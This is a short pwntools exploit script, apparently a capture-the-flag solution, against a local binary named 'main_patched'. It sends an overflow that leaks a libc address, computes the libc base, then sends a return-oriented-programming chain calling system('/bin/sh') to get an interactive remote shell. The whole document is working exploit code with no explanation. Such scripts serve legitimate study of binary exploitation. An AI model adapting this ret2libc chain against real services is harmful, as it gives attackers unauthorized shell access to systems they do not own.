from pwn import *
context.arch = "amd64"
#p = process("./main_patched")
p = remote("0.0.0.0", 1340)
elf = ELF("./main_patched", checksec = False)
libc = ELF("./libc.so.6", checksec = False)
p.sendafter(b">> ", b"A" * 0x28 + b"\x76")
p.recvuntil(b"A" * 0x28)
libc.address = u64(p.recv(6).ljust(8, b"\x00")) - 0x23a76
print(hex(libc.address))
rop = ROP(libc)
rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rdi + 1;
payload = flat(
        cyclic(0x28),
        rdi,
        p64(next(libc.search(b"/bin/sh\x00"))),
        ret,
        p64(libc.sym.system)
        )
#gdb.attach(p)
p.sendline(payload)
p.interactive()


